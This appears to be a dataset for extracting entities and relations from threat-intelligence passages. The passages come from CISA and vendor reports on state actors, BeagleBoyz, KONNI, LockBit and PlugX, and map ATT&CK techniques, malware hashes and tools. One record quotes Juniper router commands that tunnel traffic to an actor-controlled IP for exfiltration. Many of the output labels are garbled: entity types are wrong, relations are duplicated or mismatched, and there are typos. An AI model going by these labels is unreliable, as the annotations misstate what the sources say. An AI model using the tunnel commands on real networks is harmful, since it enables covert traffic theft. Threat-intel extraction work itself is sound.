{"instruction": "Table 7: Execution technique observed by CISA MITRE ID Name Observation T1072 Software Deployment Tools CISA observed activity from a Federal Government IP address beaconing out to the threat actors\u2019 C2 server, which is usually an indication of compromise. Credential Access Cyber threat actors also continue to identify large repositories of credentials that are available on the internet to enable brute-force attacks. While this sort of activity is not a direct result of the exploitation of emergent vulnerabilities, it demonstrates that cyber threat actors can effectively use available open-source information to accomplish their goals. Further, a threat actor does not require a high degree of competence or sophistication to successfully carry out this kind of opportunistic attack. CISA has observed Chinese MSS-affiliated actors using the Credential Access [TA0006] techniques highlighted in table 8. Table 8: Credential access techniques observed by CISA MITRE ID Name Observation T1003.001", "input": null, "output": "Named Entities: (T1072, technique), (Chinese MSS-affiliated actors, attacker), (TA0006, technique), (T1003.001, technique)\nRelationships: (Chinese MSS-affiliated actors, use, T1003.001), (Chinese MSS-affiliated actors, use, T1003.001)"}
{"instruction": "Operating System (OS) Credential Dumping: Local Security Authority Subsystem Service (LSASS) Memory CISA observed the threat actors using Mimikatz in conjunction with coin miner protocols and software. The actors used Mimikatz to dump credentials from the OS using a variety of capabilities resident within the tool. T1110.004 Brute Force: Credential Stuffing CISA observed what was likely a brute-force attack of a Remote Desktop Protocol on a public-facing server. Discovery As with any cyber operation, cyber threat actors must be able to confirm that their target is online and vulnerable\u2014there are a multitude of open-source scanning and reconnaissance tools available to them to use for this purpose. CISA consistently observes scanning activity across federal agencies that is indicative of discovery techniques. CISA has observed Chinese MSS-affiliated actors scanning Federal Government traffic using the discovery technique highlighted in table 9 (Discovery [TA0007]). Table 9: Discovery technique observed by CISA MITRE ID Name", "input": null, "output": "Named Entities: (Mimikatz, tool), (T1110.004, technique), (Chinese MSS-affiliated actors, attacker), (TA0007, technique)\nRelationships: (Chinese MSS-affiliated actors, use, TA0007)"}
{"instruction": "Observation T1046 Network Service Scanning CISA has observed suspicious network scanning activity for various ports at Federal Government entities. Collection Within weeks of public disclosure of CVE-2020-0688, CISA analysts identified traffic that was indicative of Chinese MSS-affiliated threat actors attempting to exploit this vulnerability using the Collection [TA0009] technique listed in table 10. Table 10: Collection technique observed by CISA MITRE ID Name Observation T1114 Email Collection CISA observed the actors targeting CVE-2020-0688 to collect emails from the exchange servers found in Federal Government environments. Command and Control", "input": null, "output": "Named Entities: (T1046, technique), (CVE-2020-0688, vulnerability), (Chinese MSS-affiliated threat actors, attacker), (TA0009, technique)\nRelationships: (CVE-2020-0688, exploited by, Chinese MSS-affiliated threat actors), (Chinese MSS-affiliated threat actors, use, TA0009)"}
{"instruction": "CISA analysts often observe cyber threat actors using external proxy tools or hop points to enable their cyber operations while remaining anonymous. These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet. For example, \u201cThe Onion Router\u201d (Tor) is often used by cyber threat actors for anonymity and C2. Actor\u2019s carefully choose proxy tools depending on their intended use. These techniques are relatively low in complexity and enabled by commercially available tools, yet they are highly effective and often reliant upon existing vulnerabilities and readily available exploits. CISA has observed Chinese MSS-affiliated actors using the Command and Control [TA0011] techniques listed in table 11. Table 11: Command and control techniques observed by CISA MITRE ID Name Observation T1090.002 Proxy: External Proxy", "input": null, "output": "Named Entities: (IaaS, tool), (SaaS, tool), (web browser, tool), (The Onion Router, tool), (Chinese MSS-affiliated actors, attacker), (TA0011, technique), (T1090.002, technique)\nRelationships: (Chinese MSS-affiliated actors, use, T1090.002), (Chinese MSS-affiliated actors, use, T1090.002)"}
{"instruction": "Initial Access The BeagleBoyz have used a variety of techniques, such as spearphishing and watering holes, to enable initial access into targeted financial institutions. Towards the end of 2018 through 2019 and in early 2020, the BeagleBoyz demonstrated the use of social engineering tactics by carrying out job-application themed phishing attacks using the following publicly available malicious files. MD5: b484b0dff093f358897486b58266d069 MD5: f34b72471a205c4eee5221ab9a349c55 MD5: 4c26b2d0e5cd3bfe0a3d07c4b85909a4 MD5: 52ec074d8cb8243976963674dd40ffe7 MD5: d1d779314250fab284fd348888c2f955 MD5: cf733e719e9677ebfbc84a3ab08dd0dc MD5: 01d397df2a1cf1d4c8e3615b7064856c The BeagleBoyz may also be working with or contracting out to criminal hacking groups, like TA505, for initial access development. The third party typically uses commodity malware to establish initial access on a victim\u2019s network and then turns over the access to the BeagleBoyz for follow-on exploitation, which may not occur until months later. The BeagleBoyz have also used the following techniques to gain an initial foothold on a targeted computer network (Initial Access [TA0001]).", "input": null, "output": "Named Entities: (BeagleBoyz, attacker), (b484b0dff093f358897486b58266d069, MD5), (f34b72471a205c4eee5221ab9a349c55, MD5), (4c26b2d0e5cd3bfe0a3d07c4b85909a4, MD5), (52ec074d8cb8243976963674dd40ffe7, MD5), (d1d779314250fab284fd348888c2f955, MD5), (cf733e719e9677ebfbc84a3ab08dd0dc, MD5), (01d397df2a1cf1d4c8e3615b7064856c, MD5), (TA505, attacker), (TA0001, technique)\nRelationships: (BeagleBoyz, use, b484b0dff093f358897486b58266d069), (BeagleBoyz, use, f34b72471a205c4eee5221ab9a349c55), (BeagleBoyz, use, 4c26b2d0e5cd3bfe0a3d07c4b85909a4), (BeagleBoyz, use, 52ec074d8cb8243976963674dd40ffe7), (BeagleBoyz, use, d1d779314250fab284fd348888c2f955), (BeagleBoyz, use, cf733e719e9677ebfbc84a3ab08dd0dc), (BeagleBoyz, use, 01d397df2a1cf1d4c8e3615b7064856c), (BeagleBoyz, work with, TA505), (BeagleBoyz, use, TA0001)"}
{"instruction": "Execution The BeagleBoyz selectively exploit victim computer systems after initially compromising a computer connected to a financial institution\u2019s corporate network. After gaining initial access to a financial institution\u2019s corporate network, the BeagleBoyz are selective in which victim systems they further exploit. The BeagleBoyz use a variety of techniques to run their code on local and remote victim systems [Execution [TA0002]). Use command-line interfaces to interact with systems and execute other software (Command and Scripting Interpreter [T1059]) Use scripts (e.g., VBScript and PowerShell) to speed up operational tasks, reduce the time required to gain access to critical resources, and bypass process monitoring mechanisms by directly interacting with the operating system (OS) at an Application Programming Interface (API) level instead of calling other programs (Command and Scripting Interpreter: PowerShell [T1059.001], Command and Scripting Interpreter: Visual Basic [T1059.005]) Rely upon specific user actions, such as opening a malicious email attachment (User Execution [T1204])", "input": null, "output": "Named Entities: (BeagleBoyz, malware), (TA0002, technique), (T1059, technique), (T1059.001, technique), (T1059.005, technique), (T1204, technique)\nRelationships: (BeagleBoyz, use, T1204), (BeagleBoyz, use, T1204), (BeagleBoyz, use, T1204), (BeagleBoyz, use, T1204), (BeagleBoyz, use, T1204)"}
{"instruction": "Persistence The BeagleBoyz use many techniques to maintain access on compromised networks through system restarts, changed credentials, and other interruptions that could affect their access (Persistence [TA0003]). Add an entry to the \u201crun keys\u201d in the Registry or an executable to the startup folder to execute malware as the user logs in under the context of the user\u2019s associated permissions levels (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]) Install a new service that can be configured to execute at startup using utilities to interact with services or by directly modifying the Registry (Create or Modify System Process: Windows Service [T1543.003]) Compromise an openly accessible web server with a web script (known as web shell) to use the web server as a gateway into a network and to serve as redundant access or persistence mechanism (Server Software Component: Web Shell [T1505.003])", "input": null, "output": "Named Entities: (BeagleBoyz, malware), (TA0003, technique), (T1547.001, technique), (T1543.003, technique), (T1505.003, technique)\nRelationships: (BeagleBoyz, use, T1505.003), (BeagleBoyz, use, T1505.003), (BeagleBoyz, use, T1505.003), (BeagleBoyz, use, T1505.003)"}
{"instruction": "Exploit hooking to load and execute malicious code within the context of another process to mask the execution, allow access to the process\u2019s memory, and, possibly, gain elevated privileges (Input Capture: Credential API Hooking [T1574.001]) Use remote services to persist within a victim\u2019s network (External Remote Services [T1133])", "input": null, "output": "Named Entities: (T1574.001, technique), (T1133, technique)\nRelationships: No related ralations."}
{"instruction": "Privilege Escalation The BeagleBoyz often seek access to financial institutions\u2019 systems that have tiered user and system accounts with customized privileges. The BeagleBoyz must overcome these restrictions to access necessary systems, monitor normal user behavior, and install and execute additional malicious tools. To do so, the BeagleBoyz have used the following techniques to gain higher-level permissions on a system or network (Privilege Escalation [TA0004]). Inject code into processes to evade process-based defenses and elevate privileges (Process Injection [T1055]) Install a new service that can be configured to execute at startup using utilities to interact with services or by directly modifying the Registry (Create or Modify System Process: Windows Service [T1543.003]) Compromise an openly accessible web server with web shell to use the web server as a gateway into a network (Server Software Component: Web Shell [T1505.003])", "input": null, "output": "Named Entities: (BeagleBoyz, malware), (TA0004, technique), (T1055, technique), (T1543.003, technique), (T1505.003, technique)\nRelationships: (BeagleBoyz, use, T1505.003), (BeagleBoyz, use, T1505.003), (BeagleBoyz, use, T1505.003), (BeagleBoyz, use, T1505.003)"}
{"instruction": "Execute malicious payloads by hijacking the search order used to load DLLs (Hijack Execution Flow: DLL Search Order Hijacking [T1574.001])", "input": null, "output": "Named Entities: (T1574.001, technique)\nRelationships: No related ralations."}
{"instruction": "Abuse Windows utilities to implement arbitrary execution commands and subvert detection and mitigation controls (such as Group Policy) that limit or prevent the usage of cmd.exe or file extensions commonly associated with malicious payloads (Indirect Command Execution [T1202]) Use various methods to prevent their commands from appearing in logs and clear command history to remove activity traces (Indicator Removal on Host: Clear Command History [T1070.003]) Disable security tools to avoid possible detection of tools and events (Impair Defenses: Disable or Modify Tools [T1562.001]) Steal the credentials of a specific user or service account to bypass access controls and grant increased privileges (Valid Accounts [T1078]) Delete or alter generated artifacts on a host system, including logs and potentially captured files, to remove traces of activity (Indicator Removal on Host: File Deletion [T1070.004])", "input": null, "output": "Named Entities: (cmd.exe, file), (T1202, technique), (T1070.003, technique), (T1562.001, technique), (T1070.004, technique)\nRelationships: No related ralations."}
{"instruction": "Credential Access The BeagleBoyz may use malware like ECCENTRICBANDWAGON to log key strokes and take screen captures. The U.S. Government has identified some ECCENTRICBANDWAGON samples that have the ability to RC4 encrypt logged data, but the tool has no network functionality. The implant uses specific formatting for logged data and saves the file locally; another tool obtains the logged data. The implant also contains no mechanism for persistence or self-loading and expects a specific configuration file to be present on the system. A full technical report for ECCENTRICBANDWAGON is available at https://us-cert.cisa.gov/northkorea. The BeagleBoyz may not always need to use custom keyloggers like ECCENTRICBANDWAGON or other tools to obtain credentials from a compromised system. Depending on the victim\u2019s environment, the BeagleBoyz have used the following techniques to steal credentials (Credential Access [TA0006]).", "input": null, "output": "Named Entities: (BeagleBoyz, attacker), (ECCENTRICBANDWAGON, malware), (https://us-cert.cisa.gov/northkorea, URL), (TA0006, technique)\nRelationships: (BeagleBoyz, use, ECCENTRICBANDWAGON), (ECCENTRICBANDWAGON, available at, https://us-cert.cisa.gov/northkorea), (BeagleBoyz, use, TA0006)"}
{"instruction": "Capture user input, such as keylogging (the most prevalent type of input capture), to obtain credentials for valid accounts and information collection (Input Capture [T1056]) Obtain account login and password information, generally in the form of a hash or a clear text password, from the operating system and software (OS Credential Dumping [T1056]) Gather private keys from compromised systems to authenticate to remote services or decrypt other collected files (Unsecured Credentials: Private Keys [T1552.004]) Manipulate default, domain, local, and cloud accounts to maintain access to credentials and certain permission levels within an environment (Account Manipulation [T1098]) Abuse hooking to load and execute malicious code within the context of another process to mask the execution, allow access to the process's memory, and, possibly, gain elevated privileges (Input Capture: Credential API Hooking [T1056.004])", "input": null, "output": "Named Entities: (T1056, technique), (T1056, technique), (T1552.004, technique), (T1098, technique), (T1056.004, technique)\nRelationships: No related ralations."}
{"instruction": "Obtain a list of network connections to and from the compromised system or remote system by querying for information over the network (System Network Connections Discovery [T1049])", "input": null, "output": "Named Entities: (T1049, technique)\nRelationships: No related ralations."}
{"instruction": "Employ hidden network shares, in conjunction with administrator-level valid accounts, to remotely access a networked system over Server Message Block (SMB) in order to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote execution (Remote Services: SMB/Windows Admin Shares [T1021.002]) Exploit valid accounts to log into a service specifically designed to accept remote connections and perform actions as the logged-on user (Remote Services [T1021])", "input": null, "output": "Named Entities: (T1021.002, technique), (T1021, technique)\nRelationships: No related ralations."}
{"instruction": "Collection Depending on various environmental attributes the BeagleBoyz encounter during their exploitation, they may deploy a variety of reconnaissance tools or use commonly available administrative tools for malicious purposes. The BeagleBoyz, like other sophisticated cyber actors, also appear to use resident, legitimate administrative tools for reconnaissance purposes when they are available; this is commonly known as \u201cliving off the land.\u201d PowerShell appears to be a popular otherwise-legitimate tool the BeagleBoyz favor for reconnaissance activities. For example, the BeagleBoyz often use publicly available code from PowerShell Empire for malicious purposes. The BeagleBoyz have used the following techniques to gather information from exploited systems (Collection [TA0009]). Use automated methods, such as scripts, for collecting data (Automated Collection [T1119]) Capture user input to obtain credentials and collect information (Input Capture [T1056]) Collect local systems data from a compromised system (Data from Local System [T1005]) Take screen captures of the desktop (Screen Capture [T1113])", "input": null, "output": "Named Entities: (BeagleBoyz, attacker), (reconnaissance tools, tool), (administrative tools, tool), (PowerShell, tool), (PowerShell Empire, tool), (TA0009, technique), (T1119, technique), (T1056, technique), (T1005, technique), (T1113, technique)\nRelationships: (BeagleBoyz, use, reconnaissance tools), (BeagleBoyz, use, administrative tools), (BeagleBoyz, use, PowerShell), (BeagleBoyz, use, PowerShell Empire), (BeagleBoyz, use, T1113), (BeagleBoyz, use, T1113), (BeagleBoyz, use, T1113), (BeagleBoyz, use, T1113), (BeagleBoyz, use, T1113)"}
{"instruction": "Exfiltration\nDuring a cyber operation, the BeagleBoyz need to exfiltrate a variety of data from compromised systems. In addition to the C2 tools noted that have built-in exfiltration features, such as CROWDEDFLOUNDER and HOPLIGHT, the BeagleBoyz use the following techniques to steal data from a network (Exfiltration [TA0010]).\nCompress and encrypt collected data before exfiltration to minimize the amount of data sent over the web and make it portable, less conspicuous, and less detectable (Archive Collected Data [T1560])\nSteal collected data via scripts (although this may require other exfiltration techniques) (Automated Exfiltration [T1020])\nEncode data using the same protocol as the C2 channel and exfiltrate it over the C2 channel (Exfiltration Over C2 Channel [T1041])", "input": null, "output": "Named Entities: (BeagleBoyz, attacker), (CROWDEDFLOUNDER, tool), (HOPLIGHT, tool), (TA0010, technique), (T1560, technique), (T1020, technique), (T1041, technique)\nRelationships: (BeagleBoyz, use, CROWDEDFLOUNDER), (BeagleBoyz, use, HOPLIGHT), (BeagleBoyz, use, T1041), (BeagleBoyz, use, T1041), (BeagleBoyz, use, T1041), (BeagleBoyz, use, Exfiltration Over C2 Channel), (Exfiltration Over C2 Channel, technique, T1041)"}
{"instruction": "Technical Details KONNI malware is often delivered via phishing emails as a Microsoft Word document with a malicious VBA macro code (Phishing: Spearphising Attachment [T1566.001]). The malicious code can change the font color from light grey to black (to fool the user to enable content), check if the Windows operating system is a 32-bit or 64-bit version, and construct and execute the command line to download additional files (Command and Scripting Interpreter: Windows Command Shell [T1059.003]). Once the VBA macro constructs the command line, it uses the certificate database tool CertUtil to download remote files from a given Uniform Resource Locator. It also incorporates a built-in function to decode base64-encoded files. The Command Prompt silently copies certutil.exe into a temp directory and renames it to evade detection.", "input": null, "output": "Named Entities: (KONNI, malware), (T1566.001, technique), (T1059.003, technique), (CertUtil, tool), (Command Prompt, tool), (certutil.exe, file)\nRelationships: (KONNI, use, T1059.003), (KONNI, Command and Scripting Interpreter: Windows Command Shell [T1059.003]), (KONNI, use, Command Prompt), (Command Prompt, copy, certutil.exe), (Command Prompt, rename, certutil.exe)"}
{"instruction": "Command and Scripting Interpreter: Windows Command Shell [T1059.003] KONNI has used cmd.exe to execute arbitrary commands on the infected host across different stages of the infection change. Indicator Removal on Host: File Deletion [T1070.004] KONNI can delete files. Application Layer Protocol: Web Protocols [T1071.001] KONNI has used Hypertext Transfer Protocol for command and control. System Information Discovery [T1082] KONNI can gather the operating system version, architecture information, connected drives, hostname, and computer name from the victim\u2019s machine and has used systeminfo.exe to get a snapshot of the current system state of the target machine. File and Directory Discovery [T1083] A version of KONNI searches for filenames created with a previous version of the malware, suggesting different versions targeted the same victims and the versions may work together. Ingress Tool Transfer [T1105] KONNI can download files and execute them on the victim\u2019s machine. Modify Registry [T1112]", "input": null, "output": "Named Entities: (KONNI, malware), (cmd.exe, file), (T1059.003, technique), (T1070.004, technique), (T1071.001, technique), (T1082, technique), (T1083, technique), (T1105, technique), (T1112, technique), (systeminfo.exe, file)\nRelationships: (KONNI, use, cmd.exe), (KONNI, use, T1112), (KONNI, use, T1112), (KONNI, use, T1112), (KONNI, use, T1112), (KONNI, use, systeminfo.exe), (KONNI, use, T1112), (KONNI, use, T1112), (KONNI, use, T1112)"}
{"instruction": "ATT&CK\nInitial Access [TA0001]\nExploit Public-Facing Applications [T1190]\nCommand and Control [TA0011]\nCommonly Used Port [T1043]\nConnection Proxy [T1090]\nCustom Command and Control Protocol [T1094]\nCustom Cryptographic Protocol [T1024]\nMulti-hop Proxy [T1188]\nMultilayer Encryption [T1079]\nStandard Application Layer Protocol [T1071]\nExfiltration [TA0010]\nImpact [TA0040]\nData Encrypted for Impact [T1486]\nEndpoint Denial of Service [T1499]\nNetwork Denial of Service [T1498]", "input": null, "output": "Named Entities: (TA0001, technique), (T1190, technique), (TA0011, technique), (T1043, technique), (T1090, technique), (T1094, technique), (T1024, technique), (T1188, technique), (T1079, technique), (T1071, technique), (TA0010, technique), (TA0040, technique), (T1486, technique), (T1499, technique), (T1498, technique)\nRelationships: No related ralations."}
{"instruction": "Russian state-sponsored APT actors have performed large-scale scans in an attempt to find vulnerable servers. Phishing for Information [T1598] Russian state-sponsored APT actors have conducted spearphishing campaigns to gain credentials of target networks. Resource Development [TA0042] Develop Capabilities: Malware [T1587.001] Russian state-sponsored APT actors have developed and deployed malware, including ICS-focused destructive malware. Initial Access [TA0001] Exploit Public Facing Applications [T1190] Russian state-sponsored APT actors use publicly known vulnerabilities, as well as zero-days, in internet-facing systems to gain access to networks. Supply Chain Compromise: Compromise Software Supply Chain [T1195.002] Russian state-sponsored APT actors have gained initial access to victim organizations by compromising trusted third-party software. Notable incidents include M.E.Doc accounting software and SolarWinds Orion. Execution [TA0002] Command and Scripting Interpreter: PowerShell [T1059.003] and Windows Command Shell [T1059.003]", "input": null, "output": "Named Entities: (Russian state-sponsored APT actors, attacker), (T1598, technique), (TA0042, technique), (T1587.001, technique), (TA0001, technique), (T1190, technique), (T1195.002, technique), (SolarWinds Orion, tool), (TA0002, technique), (T1059.003, technique), (PowerShell, tool), (Windows Command Shell, tool)\nRelationships: (Russian state-sponsored APT actors, use, T1059.003), (Russian state-sponsored APT actors, use, T1059.003), (Russian state-sponsored APT actors, use, T1059.003), (Russian state-sponsored APT actors, gain access to, SolarWinds Orion), (Russian state-sponsored APT actors, use, T1059.003), (Russian state-sponsored APT actors, use, T1059.003), (Russian state-sponsored APT actors, use, Windows Command Shell)"}
{"instruction": "Acquire infrastructure [T1583] to establish domains that impersonate legitimate entities [T1583.001], aka \u2018typosquatting\u2019, to use in watering hole attacks and as command and control (C2) [TA0011] infrastructure Establish new [T1585.002] and compromise existing [T1586.002] email and social media accounts [1585.001] to conduct social engineering attacks Initial Access [TA0001] External remote services (e.g., virtual private network [VPN] services) [T1133] Spearphishing emails with malicious attachments [T1566.001] and links [T1566.002] Drive-by compromises [T1189] and exploitation of public-facing applications [T1190] Access to valid [T1078], compromised administrative [T1078.001] accounts Execution [TA0002] Command and scripting interpreters [T1059] such as PowerShell [T1059.001] Exploitation of software vulnerabilities in client applications to execute code [T1203] using lure documents that dropped malware exploiting various Common Vulnerabilities and Exposures (CVEs) User execution [T1204] of malicious files [T1204.002] and links [T1566.002] attached to spearphishing emails [T1566.001] Persistence [TA0003], Privilege Escalation [TA0004], Credential Access [TA0006], Discovery [TA0007], and Lateral Movement [TA0008]", "input": null, "output": "Named Entities: (T1583, technique), (T1583.001, technique), (TA0011, technique), (T1585.002, technique), (T1586.002, technique), (T1585.001, technique), (TA0001, technique), (T1133, technique), (T1566.001, technique), (T1566.002, technique), (T1189, technique), (T1190, technique), (T1078, technique), (T1078.001, technique), (TA0002, technique), (T1059, technique), (T1059.001, technique), (T1203, technique), (T1204, technique), (T1204.002, technique), (T1204.002, technique), (TA0003, technique), (TA0004, technique), (TA0006, technique), (TA0007, technique), (TA0008, technique)\nRelationships: No related ralations."}
{"instruction": "Abuse compiled HTML files (.chm), commonly distributed as part of the Microsoft HTML Help system, to conceal malicious code (Signed Binary Proxy Execution: Compiled HTML File [T1218.001]) Prepend a space to all their terminal commands to operate without leaving traces in the HISTCONTROL environment, which is configured to ignore commands that start with a space (Impair Defenses: HISTCONTROL [T1562.003]) Modify malware so it has a different signature and re-use it in cases when the group determines it was quarantined (Obfuscated Files or Information: Indicator Removal from Tools [T1027.005]) Attempt to block indicators or events typically captured by sensors from being gathered and analyzed (Impair Defenses: Indicator Blocking [T1562.006]) Use the Windows DLLs search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence (Hijack Execution Flow: DLL Search Order Hijacking [T1574.001])", "input": null, "output": "Named Entities: (Microsoft HTML Help system, tool), (T1218.001, technique), (T1562.003, technique), (T1027.005, technique), (T1562.006, technique), (T1574.001, technique)\nRelationships: No related ralations."}
{"instruction": "Armed with valid accounts and credentials from the compromised RADIUS server and the router configurations, the cyber actors returned to the network and used their access and knowledge to successfully authenticate and execute router commands to surreptitiously route [T1599], capture [T1020.001], and exfiltrate traffic out of the network to actor-controlled infrastructure. While other manufacturers likely have similar commands, the cyber actors executed the following commands on a Juniper router to perform initial tunnel configuration for eventual exfiltration out of the network: set chassis fpc <slot number> pic <user defined value> tunnel-services bandwidth <user defined value> set chassis network-services all-ethernet set interfaces <interface-id> unit <unit number> tunnel source <local network IP address> set interfaces <interface-id> unit <unit number> tunnel destination <actor controlled IP address> After establishing the tunnel, the cyber actors configured the local interface on the device and updated the routing table to route traffic to actor-controlled infrastructure.", "input": null, "output": "Named Entities: (RADIUS server, tool), (Juniper router, tool), (T1599, technique), (T1020.001, technique)\nRelationships: (cyber actors, use, T1020.001), (cyber actors, use, T1020.001)"}
{"instruction": "Appendix: Detailed Tactics, Techniques, and Procedures Reconnaissance [TA0043] Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. The adversary is known for harvesting login credentials [T1589.001].[17] ID Name Description T1589.001 Gather Victim Identity Information: Credentials Adversaries may gather credentials that can be used during targeting. Initial Access [TA0001]", "input": null, "output": "Named Entities: (TA0043, technique), (TA0043, technique), (T1589.001, technique)\nRelationships: No related ralations."}
{"instruction": "Detecting methods of credential dumping Credential dumping has long been used as a step in post-breach lateral movement and is listed as T1003 in the MITRE ATT&CK\u2122 Framework . One of the challenges in protecting against all forms of credential dumping is that attackers attempt to masquerade their methods as legitimate activity, sometimes leveraging standard administrative tools to achieve the dumping. There are also easily available tools online, such as Hacktool.Mimikatz , which use a variety of methods to dump credentials. Attempts at credential dumping can be uncovered in a variety of ways by our Symantec solutions. Here, I will discuss how our Symantec Endpoint Detection and Response (SEDR) product provides visibility into attempted credential theft by identifying a wide range of credential-dumping techniques, including: Access to the Security Accounts Manager (SAM) area of the registry Keylogging Sniffing credentials from network traffic Reading protected storage on the system", "input": null, "output": "Named Entities: (T1003, technique), (Hacktool.Mimikatz, tool)\nRelationships: No related ralations."}
{"instruction": "All network IOCs have been added to the FortiGuard WebFilter blocklist. FortiGuard Antivirus has coverage in place as follows: W32/Lockbit.K!tr.ransom The FortiGuard Antivirus service engine is included in Fortinet\u2019s FortiGate, FortiMail, FortiClient, and FortiEDR solutions. In addition, as part of our membership in the Cyber Threat Alliance, details of this threat were shared in real-time with other Alliance members to help create better protections for customers. Learn more about Fortinet\u2019s FortiGuard Labs threat research and intelligence organization and the FortiGuard AI-powered security services portfolio. If you think this or any other cybersecurity threat has impacted your organization, contact our Global FortiGuard Incident Response Team. Appendix A: MITRE ATT&CK Tactics and Techniques Tactic \\ Technique ID Description TA0002 Execution T1059.003 Command and Scripting Interpreter: Windows Command Shell T1059.005 Command and Scripting Interpreter: Visual Basic T1059.006 Command and Scripting Interpreter: Python T1204.002 User Execution: Malicious File TA0003 Persistence T1547.004", "input": null, "output": "Named Entities: (W32/Lockbit.K!tr.ransom, threat type), (TA0002, technique), (T1059.003, technique), (T1059.005, technique), (T1059.006, technique), (T1204.002, technique), (T1547.004, technique)\nRelationships: No related ralations."}
{"instruction": "We also suggest that organizations have their end users go through our FREE NSE training: NSE 1 \u2013 Information Security Awareness. It includes a module on Internet threats that is designed to help end users learn how to identify and protect themselves from various types of phishing attacks. MITRE TTPs Collection Data from Local System T1005 Credential Access Credential in Files T1552.001 Defense Evasion File Deletion T1070.004 Discovery System Information Discovery T1082 Execution Command-Line Interface T1059 Impact Inhibit System Recovery T1490", "input": null, "output": "Named Entities: (phishing attacks, threat type), (T1005, technique), (T1552.001, technique), (T1070.004, technique), (T1082, technique), (T1059, technique), (T1490, technique)\nRelationships: No related ralations."}
{"instruction": "7) Search Drives: It searches for unmounted drives on the system and mounts them to encrypt them as well (T1005). 8) Setup Multi-Threading: The sample uses worker threads to distribute the encryption process. More on this later. 9) Enumerate Filesystem: The worker threads start to enumerate the filesystems of the identified drives (T1083). 10) Drop Ransom Note: The ransom note is dropped in every folder in Restore_My_Files.txt. 11) Check File Name Blacklist: For every file and folder a blacklist of file/folder names is checked. If the file/folder is on the blacklist it will not be encrypted. More on this later. 12) Check File Extension Blacklist: Each file is checked against a file extension blacklist. If the extension is on the list, it will not be encrypted. 13) Unlock File: If the file is locked by a running process, the sample will try to unlock it using the Windows Restart Manager(T1489).", "input": null, "output": "Named Entities: (T1005, technique), (T1083, technique), (T1489, technique)\nRelationships: No related ralations."}
{"instruction": "Appendix A: MITRE ATT&CK Techniques\nID\nDescription\nT1190\nExploit Public-Facing Application\nT1569.002\nSystem Services: Service Execution\nT1059.001\nCommand and Scripting Interpreter: PowerShell\nT1027\nObfuscated Files or Information:\u00a0Software Packing\nT1041\nExfiltration Over C2 Channel\nT1082\nSystem Information Discovery\nT1036\nMasquerading\nT1083\nFile and Directory Discovery\nT1059.003\nCommand and Scripting Interpreter: Windows Command Shell\nT1592\nGather Victim Host Information\nT1588.003\nObtain Capabilities: Code Signing Certificates\nT1014\nRootkit\nT1574.002\nHijack Execution Flow: DLL Side-Loading\nT1620\nReflective Code Loading\nT1113\nScreen Capture", "input": null, "output": "Named Entities: (T1190, technique), (T1569.002, technique), (T1059.001, technique), (T1027, technique), (T1041, technique), (T1082, technique), (T1036, technique), (T1083, technique), (T1059.003, technique), (T1592, technique), (T1588.003, technique), (T1014, technique), (T1574.002, technique), (T1620, technique), (T1113, technique)\nRelationships: No related ralations."}
{"instruction": "Many of the specific techniques identified in the report are heavily focused on \u201cliving off the land.\u201d This means using legitimate systems, tools, or functions already present on a system to move around the device or network without attracting attention. T1053 (Schedule Task/Job) is the most common of these techniques, representing over 24% of all sightings. It is followed by Command and Script Interpreter (T1059), representing 15.77%. These techniques have been employed across all major platforms, attacking Linux, Windows, and macOS. The other techniques combined accounted for less than 11% of all sightings. Zero-trust strategies can play a critical role in defending against these techniques. Again, quoting from the report, \u201cAdversaries are attempting to appear as legitimate users. Therefore, creating strong baselines and restricting permissions is key to detecting and disrupting adversary behaviors.\u201d", "input": null, "output": "Named Entities: (T1053, technique), (T1059, technique)\nRelationships: No related ralations."}
{"instruction": "T1003.001 - OS Credential Dumping: LSASS Memory Execution T1569.002 - System Services: Service Execution Defense Evasion T1574.002 - Hijack Execution Flow: DLL Side-Loading T1140 - Deobfuscate/Decode Files or Information T1070.004 - Indicator Removal: File Deletion T1036.005 - Match Legitimate Name or Location Persistence T1053.005 - Scheduled Task Privelege Escalation T1548.002 - Bypass User Account Control T1068 - Exploitation for Privilege Escalation T1546.012 - Event Triggered Execution: Image File Execution Options Injection", "input": null, "output": "Named Entities: (T1003.001, technique), (T1569.002, technique), (T1574.002, technique), (T1140, technique), (T1070.004, technique), (T1036.005, technique), (T1053.005, technique), (T1548.002, technique), (T1068, technique), (T1546.012, technique)\nRelationships: No related ralations."}
{"instruction": "\nIntroduction\nTrend Micro\u2019s Managed Extended Detection and Response (MxDR) team discovered that a file called x32dbg.exe was used (via the DLL Search Order Hijacking or T1574.001 technique) to sideload a malicious DLL we identified as a variant of PlugX (Trojan.Win32.KORPLUG.AJ.enc). This file is a legitimate open-source debugger tool for Windows that is generally used to examine kernel-mode and user-mode code, crash dumps, or CPU registers. Meanwhile, PlugX is a well-known remote access trojan (RAT) that is used to gain remote access to and control over compromised machines. It allows an attacker to obtain unauthorized access to a system, steal sensitive data, and use the compromised machine for malicious purposes. The MxDR team employed a number of advanced security technologies and solutions to gain a comprehensive understanding of the attack, which will be revealed in this report.", "input": null, "output": "Named Entities: (x32dbg.exe, file), (T1574.001, technique), (malicious DLL, malware), (PlugX, malware), (Trojan.Win32.KORPLUG.AJ.enc, malware), (remote access trojan, threat type)\nRelationships: (malicious DLL, use, T1574.001)"}
{"instruction": "This function checks for the file \u201c/host/root/.aws/credentials\u201d. It is interesting to note that the path /host in the container maps back to the root directory \u201c/\u201d on the host. If the file exists, then it is sent via a curl request to the attacker\u2019s endpoint. If the function does not find credentials in local file systems and remote file shares (Mitre ID T1552.001 Unsecured Credentials: Credentials In Files), the IMDS endpoints are queried using curl or wget whether they are available or not. The output is processed through a series of grep and sed operations, and the output is accumulated in hidden files \u201c.iam\u201d and \u201c.ec2\u201d (Mitre ID T1564.001 Hide Artifacts: Hidden Files and Directories).", "input": null, "output": "Named Entities: (T1552.001, technique), (curl, tool), (wget, tool), (T1564.001, technique)\nRelationships: No related ralations."}
